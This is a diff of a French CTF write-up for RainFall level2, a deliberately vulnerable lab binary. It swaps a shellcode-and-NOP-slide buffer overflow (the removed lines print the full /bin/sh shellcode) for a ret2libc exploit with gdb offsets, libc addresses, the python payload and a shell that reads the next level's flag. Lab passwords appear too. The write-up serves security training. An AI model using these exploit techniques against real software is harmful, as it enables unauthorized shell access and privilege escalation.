@@ -64,76 +64,64 @@ On calcul l'**offset** qui va nous permettre de faire le **buffer overflow**:
 ```gdb
 > gdb -q level2
 Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
-(gdb) > b *0x080484f2 # Adresse juste apres le gets
+(gdb) > b *p+30 # Adresse juste apres le gets
 (gdb) > run
 Starting program: /home/user/level2/level2
 AAAAAAAAAAAAA
 
 Breakpoint 1, 0x080484f2 in p ()
-(gdb) > i f
- Stack level 0, frame at 0xbffff680:
+> (gdb) x/10x $eax
+0xbffff6bc:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6cc:     0xb7fd0f00      0x08048550      0x08049828      0x00000001
+0xbffff6dc:     0x08048381      0xb7fd13e4
+
+> (gdb) i f
+Stack level 0, frame at 0xbffff710:
  eip = 0x80484f2 in p; saved eip 0x804854a
- called by frame at 0xbffff690
- Arglist at 0xbffff678, args:
- Locals at 0xbffff678, Previous frame's sp is 0xbffff680
+ called by frame at 0xbffff720
+ Arglist at 0xbffff708, args:
+ Locals at 0xbffff708, Previous frame's sp is 0xbffff710
  Saved registers:
-  ebp at 0xbffff678, eip at 0xbffff67c
-(gdb) > p 0xbffff67c - 0xbffff62c
+  ebp at 0xbffff708, eip at 0xbffff70c
+ 
+> (gdb) p 0xbffff70c - 0xbffff6bc
 $1 = 80
+
+> p *system
+$3 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ```
 > OFFSET : 80
->
-> SHELLCODE: <code>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</code>
->
->POP POP RET: <code>0x080485c7   edi ebp ret</code>
+> SYSTEM: <code>0xb7e6b060</code>
+> RET: <code>0x0804853e</code>
+> EXIT: <code>0xb7e5ebe0</code>
 
-Nous commençons par créer une varibale d'environnement avec notre **SHELLCODE** précédé d'une NOPSLIDE (assez grande pour mieux la repérer).
-<pre><code>export SHELLCODE=`python -c 'print "\x90"*100+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
-</code></pre>
 
-On cherche par la suite l'adresse de notre **SHELLCODE** afin de trouver une adresse d'un des NOP qu'on utlisera pour le buffer overflow.
-```gdb
-> gdb -q level2
-Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
-(gdb) > b * p
-Breakpoint 1 at 0x80484d4
-(gdb) > run
-Starting program: /home/user/level2/level2
 
-Breakpoint 1, 0x080484d4 in p ()
-(gdb) > x/100xs environ
-...
-0xbffff866:    SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061۰\006̀Sh/ttyh/dev\211\343\061\311f\271\022'\260\005̀1\300Ph//shh/bin\211\343PS\211ᙰ\v̀"
-(gdb) > x/100sx 0xbffff866
-0xbffff866:     0x53    0x48    0x45    0x4c    0x4c    0x43    0x4f    0x44
-0xbffff86e:     0x45    0x3d    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff876:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff87e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff886:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff88e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff896:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff89e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff8a6:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff8ae:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff8b6:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff8be:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
-0xbffff8c6:     0x90    0x90    0x90    0x90
+Pour récupéré l'adresse de /bin/sh, on écrit un petit programme en C dans /tmp.
+
+```bash
+> touch /tmp/getsh.c
+> echo "#include <stdio.h>
+#include <stdlib.h>
+int main(){ printf(\"SHELL= %p\n\", getenv(\"SHELL\")); return 0; }" > /tmp/getsh.c
+> cd /tmp
+> gcc getsh.c
+> ./a.out
+SHELL= 0xbffff945
 ```
-On prend l'une des adresses qui ne contient que des **NOP**: <code>0xbffff8a6</code> et on génère notre commande pour le **buffer overflow** :
-<pre><code>(python -c 'print "A" * 80 + "\xc7\x85\x04\x08" + "\xa6\xf8\xff\xbf"') | ./level2</code></pre>
-> [OFFSET] = A * 80 [POP POP RET] = 0x080485c7 (little endian) [NOP ADDRESS] = Qui va mener au SHELLCODE
-<pre><code>> cd ../level3 && cat .pass
+
+On change l'environement du shell pour passer sur /bin/sh car bash garde les privilèges de l'utilisateur qui l'invoque.
+On execute ensuite le programme avec notre buffer overflow suivi d'une addresse de ret, d'une addresse système, de l'addresse d'un exit et de l'addresse du /bin/sh.
+Si l'addresse est légèrement décaler (in/sh par exemple), il suffit de modifier légèrement l'addresse pour obtenir /bin/sh.
+
+```bash
+> SHELL=/bin/sh
+level2@RainFall:~$ (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7'+ '\x45\xf9\xff\xbf'"; cat) | ./level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`E
+sh: 1: in/sh: Permission denied
+^C`
+level2@RainFall:~$ (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7'+ '\x43\xf9\xff\xbf'"; cat) | ./level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`C`
+cd ../level3 && cat .pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
-</code></pre>
-
-For download :
-<pre><code>scp -P4242 level2@192.168.1.78:level2 .</code></pre>
-> Password : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-
-
-# Bonus
-
-Ici un simple **ret** suffit, il suffit de prendre notre adresse de ret dans p :
-<pre><code>0x0804853e
-\x3e\x85\x04\x08 (little endian)
-</code></pre>
+```
